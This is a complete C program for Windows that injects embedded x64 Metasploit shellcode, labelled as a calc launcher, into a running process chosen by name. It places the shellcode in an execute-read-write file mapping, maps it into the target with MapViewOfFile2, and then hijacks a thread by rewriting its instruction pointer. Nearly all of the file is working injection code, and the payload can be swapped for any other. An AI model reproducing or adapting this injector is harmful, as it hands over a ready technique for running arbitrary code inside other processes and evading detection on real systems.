#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <psapi.h>

// This compiles MapViewOfFile2
#pragma comment (lib, "OneCore.lib")

// x64 calc metasploit shellcode 
unsigned char shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// Function to find the handle of the target process by name
BOOL FindProcessHandle(LPCWSTR targetProcessName, DWORD* processId, HANDLE* processHandle) {
    DWORD processIds[1024], cbNeeded, processCount;

    // Enumerate all processes in the system
    if (!EnumProcesses(processIds, sizeof(processIds), &cbNeeded)) {
        printf("[!] Error: Failed to enumerate processes. Error code: %d\n", GetLastError());
        return FALSE;
    }

    processCount = cbNeeded / sizeof(DWORD);

    // Loop through all process IDs
    for (unsigned int i = 0; i < processCount; i++) {
        if (processIds[i] != 0) {
            // Try to open the process with query and read access
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
            if (hProc) {
                WCHAR currentProcessName[MAX_PATH] = L"<unknown>";

                HMODULE hMod;
                DWORD cbNeededMod;
                // Get the base module of the process (to retrieve the process name)
                if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeededMod)) {
                    GetModuleBaseName(hProc, hMod, currentProcessName, sizeof(currentProcessName) / sizeof(WCHAR));
                }

                // Convert both process names to lowercase for case-insensitive comparison
                WCHAR lowerCurrentName[MAX_PATH];
                WCHAR lowerTargetName[MAX_PATH];
                for (int j = 0; currentProcessName[j]; j++)
                    lowerCurrentName[j] = (WCHAR)tolower(currentProcessName[j]);
                lowerCurrentName[lstrlenW(currentProcessName)] = '\0';

                for (int j = 0; targetProcessName[j]; j++)
                    lowerTargetName[j] = (WCHAR)tolower(targetProcessName[j]);
                lowerTargetName[lstrlenW(targetProcessName)] = '\0';

                // If the process name matches the target process name, open it with full access
                if (wcscmp(lowerCurrentName, lowerTargetName) == 0) {
                    *processId = processIds[i];
                    *processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIds[i]);
                    if (*processHandle == NULL) {
                        printf("[!] Error: Failed to open target process. Error code: %d\n", GetLastError());
                    }

                    CloseHandle(hProc);
                    return TRUE;
                }

                CloseHandle(hProc);
            }
        }
    }

    printf("[!] Error: Target process not found.\n");
    return FALSE;
}

// Function to find a thread handle within the specified process
BOOL FindThreadHandle(DWORD processId, DWORD* threadId, HANDLE* threadHandle) {
    // Create a snapshot of all threads in the system
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Error: Failed to create thread snapshot. Error code: %d\n", GetLastError());
        return FALSE;
    }

    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    // Iterate through the threads and find one belonging to the target process
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                *threadId = threadEntry.th32ThreadID;
                *threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                if (*threadHandle == NULL) {
                    printf("[!] Error: Failed to open target thread. Error code: %d\n", GetLastError());
                }
                break;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    CloseHandle(snapshot);

    return (*threadId != 0 && *threadHandle != NULL);
}

// Function to inject shellcode into the target process using file mapping
BOOL InjectShellcode(HANDLE processHandle, PBYTE shellcode, SIZE_T shellcodeSize, PVOID* remoteAddress) {
    // Create a file mapping object to store the shellcode in memory
    HANDLE fileMappingHandle = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, shellcodeSize, NULL);
    if (fileMappingHandle == NULL) {
        printf("[!] Error: Failed to create file mapping. Error code: %d\n", GetLastError());
        return FALSE;
    }

    // Map the file into the local process's memory space
    PVOID localMappingAddress = MapViewOfFile(fileMappingHandle, FILE_MAP_WRITE, NULL, NULL, shellcodeSize);
    if (localMappingAddress == NULL) {
        printf("[!] Error: Failed to map file view locally. Error code: %d\n", GetLastError());
        CloseHandle(fileMappingHandle);
        return FALSE;
    }

    // Write the shellcode into the local mapped memory
    printf("[+] Local mapping address: 0x%p\n", localMappingAddress);
    printf("[i] Writing shellcode to local memory...\n");
    memcpy(localMappingAddress, shellcode, shellcodeSize);
    printf("[+] Shellcode written successfully.\n");

    // Map the file into the remote (target) process's memory space
    PVOID remoteMappingAddress = MapViewOfFile2(fileMappingHandle, processHandle, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (remoteMappingAddress == NULL) {
        printf("[!] Error: Failed to map file view remotely. Error code: %d\n", GetLastError());
        UnmapViewOfFile(localMappingAddress);
        CloseHandle(fileMappingHandle);
        return FALSE;
    }

    printf("[+] Remote mapping address: 0x%p\n", remoteMappingAddress);

    *remoteAddress = remoteMappingAddress;
    UnmapViewOfFile(localMappingAddress);
    CloseHandle(fileMappingHandle);
    return TRUE;
}

// Function to hijack a thread and redirect its execution to the shellcode
BOOL HijackThread(HANDLE threadHandle, PVOID targetAddress) {
    CONTEXT threadContext = { 0 };
    threadContext.ContextFlags = CONTEXT_ALL;

    // Suspend the thread and get its context (registers, etc.)
    SuspendThread(threadHandle);
    if (!GetThreadContext(threadHandle, &threadContext)) {
        printf("[!] Error: Failed to get thread context. Error code: %d\n", GetLastError());
        return FALSE;
    }

    // Change the instruction pointer (RIP) to point to the shellcode address
    threadContext.Rip = (DWORD64)targetAddress;

    // Set the modified thread context
    if (!SetThreadContext(threadHandle, &threadContext)) {
        printf("[!] Error: Failed to set thread context. Error code: %d\n", GetLastError());
        return FALSE;
    }

    // Wait for the user to resume the thread (optional for debugging purposes)
    printf("[i] Press <Enter> to resume the thread...\n");
    getchar();

    ResumeThread(threadHandle);

    // Wait for the shellcode to finish executing
    WaitForSingleObject(threadHandle, INFINITE);

    return TRUE;
}

int wmain() {
    HANDLE processHandle = NULL, threadHandle = NULL;
    DWORD processId = 0, threadId = 0;
    PVOID shellcodeAddress = NULL;

    size_t bufferSize = 256;
    LPWSTR targetProcessName = (LPWSTR)malloc(bufferSize * sizeof(wchar_t));

    if (targetProcessName == NULL) {
        wprintf(L"[!] Error: Memory allocation failed.\n");
        return -1;
    }

    // Get the name of the target process from the user
    wprintf(L"[*] Enter the name of the target process: ");
    wscanf_s(L"%255ls", targetProcessName, (unsigned)bufferSize);

    // Find the process by name
    wprintf(L"[i] Searching for the process \"%s\"...\n", targetProcessName);
    if (!FindProcessHandle(targetProcessName, &processId, &processHandle)) {
        free(targetProcessName);
        return -1;
    }
    printf("[+] Process found with ID: %d\n", processId);

    // Find a thread within the target process
    printf("[i] Searching for a thread in the target process...\n");
    if (!FindThreadHandle(processId, &threadId, &threadHandle)) {
        free(targetProcessName);
        return -1;
    }
    printf("[+] Thread found with ID: %d\n", threadId);

    // Inject the shellcode into the target process
    printf("[i] Injecting shellcode into the target process...\n");
    if (!InjectShellcode(processHandle, shellcode, sizeof(shellcode), &shellcodeAddress)) {
        free(targetProcessName);
        return -1;
    }

    // Hijack the target thread to execute the shellcode
    printf("[i] Hijacking the thread to execute the shellcode...\n");
    if (!HijackThread(threadHandle, shellcodeAddress)) {
        free(targetProcessName);
        return -1;
    }

    // Cleanup handles and memory
    CloseHandle(threadHandle);
    CloseHandle(processHandle);
    free(targetProcessName);

    printf("[i] Shellcode executed successfully.\n");

    return 0;
}
